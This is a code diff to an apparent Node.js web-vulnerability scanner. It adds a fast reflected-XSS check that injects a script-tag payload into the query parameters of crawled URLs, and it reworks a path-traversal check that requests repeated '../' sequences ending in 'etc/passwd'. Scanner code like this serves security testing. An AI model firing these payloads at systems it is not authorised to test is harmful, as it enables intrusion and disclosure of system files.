@@ -4,6 +4,7 @@ const cheerio = require('cheerio');
 const readline = require('readline');
 const open = require('open');
 const puppeteer = require('puppeteer');
+const request = require('request');
 const http = require('http');
 const { response } = require('express');
 const scan = require("../models/scan");
@@ -44,15 +45,61 @@ const xss_scan_success = async(req, res) => {
 const xss_scan = async (req, res) => {
   const currentScanID = await getNewScanID();
 
-  const {url, option} = req.body.href;
+  const {href, option} = req.body;
+
+  console.log("url : " + href)
+  console.log("option : " + option)
   
 
     const regexp = /=/g;
 
-    try {
-        const result = await crawl(url);
+    if(option == "fast"){
+
+      const result = await crawl(href);
+      const payload = "<script>alert('xss test');</script>";
+        
+      for(const url in result){
+        const match1 = url.indexOf("?");
+        const match2 = url.indexOf("=");
+        const match3 = url.match(regexp);
+        const match4 = url.indexOf("&");
+
+        if (match1 !== -1 && match2 !== -1 && match3 && match3.length < 2 && match4 === -1) {
+
+          let victim_base_url = url.substr(0, match2 + 1);
+          let victim_url = victim_base_url + payload;
+          console.log(victim_url);
+
+          const options = {
+            uri: victim_url,
+          };
+    
+          request(options, function(err, response, body) {
+            if (err) {
+              console.error(err);
+              return;
+            }
+
+          if(body.includes(payload)){
+            scan.create({
+              scanID: currentScanID,
+              scanType: "Fast Scan Reflected XSS",
+              inputURL: url,
+              scanURL: victim_base_url,
+              scanPayload: payload
+          });
+          }
+        });
+      }
+
+      }
+
+    }else{
+
+      try {
+        const result = await crawl(href);
         for (const url in result) {
-        console.log(url);
+        console.log(href);
         const match1 = url.indexOf("?");
         const match2 = url.indexOf("=");
         const match3 = url.match(regexp);
@@ -71,10 +118,9 @@ const xss_scan = async (req, res) => {
                 const page = await browser.newPage();
 
                 if (xss_scan_success_data) {
-                    console.log("testsetetset")
                     scan.create({
                         scanID: currentScanID,
-                        scanType: "Reflected XSS",
+                        scanType: "Accurate Reflected XSS",
                         inputURL: url,
                         scanURL: victim_base_url,
                         scanPayload: xss_payload
@@ -95,6 +141,9 @@ const xss_scan = async (req, res) => {
     } catch (error) {
         console.error(error);
     }
+      
+    }
+    
 };
 
 
@@ -102,25 +151,26 @@ const xss_scan = async (req, res) => {
 const pathtraversal_scan = async(req, res) => {
   const currentScanID = await getNewScanID();
 
-  const url = req.body.href;
+  const href = req.body.href;
   const path_traversal_payload_arr = "../";
   const regexp = /=/g;
 
-  await crawl(url);
+  const result = await crawl(href);
 
-  const site_tree = fs.readFileSync('site_tree.txt').toString().split("\n");
 
-  for(let i in site_tree){
-    const match1 = site_tree[i].indexOf("?");
-    const match2 = site_tree[i].indexOf("=");
-    const match3 = site_tree[i].match(regexp);
-    const match4 = site_tree[i].indexOf("&");
+  for(const url in result){
+    const match1 = url.indexOf("?");
+    const match2 = url.indexOf("=");
+    const match3 = url.match(regexp);
+    const match4 = url.indexOf("&");
+
+    console.log(url);
 
     if(match1 !== -1 && match2 !== -1 && match3 && match3.length < 2 && match4 === -1){
       for (let j = 0; j < 10; j++) {
         try {
           let path_traversal_scan_payload = path_traversal_payload_arr.repeat(j + 1) + "etc/passwd"
-          let victim_url = site_tree[i].substr(0, match2 + 1) + path_traversal_scan_payload;
+          let victim_url = url.substr(0, match2 + 1) + path_traversal_scan_payload;
 
           const response = await new Promise(resolve => {
               http.request(victim_url, resolve).end();
@@ -132,11 +182,10 @@ const pathtraversal_scan = async(req, res) => {
               scan.create({
               scanID: currentScanID,
               scanType: "Path Traversal",
-              inputURL: url,
-              scanURL: site_tree[i],
+              inputURL: href,
+              scanURL: url,
               scanPayload: path_traversal_scan_payload
               });
-              break;
           }
         } 
         catch(error) {
